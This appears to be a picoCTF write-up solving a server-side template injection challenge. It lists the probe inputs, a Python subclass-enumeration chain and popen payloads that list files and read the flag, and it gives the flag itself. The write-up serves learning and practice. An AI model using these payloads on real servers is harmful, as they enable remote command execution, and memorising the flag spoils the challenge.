# Description

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website!

# Solution

- we get a web page where we can input text and get back the text we put in
- based on the clues in the description, i assume this site is vulnerable to server side template injection
- we test this with the following commands:
	- {{7*7}} 
	- {{7*'7'}}
- we look for useful classes
	- {{''.__class__.__mro__[1].__subclasses__()}}
- using {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.popen('ls -la').read() }} i find a file called flag
- i read the file using {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.popen('cat flag').read() }}

# Flag

- flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
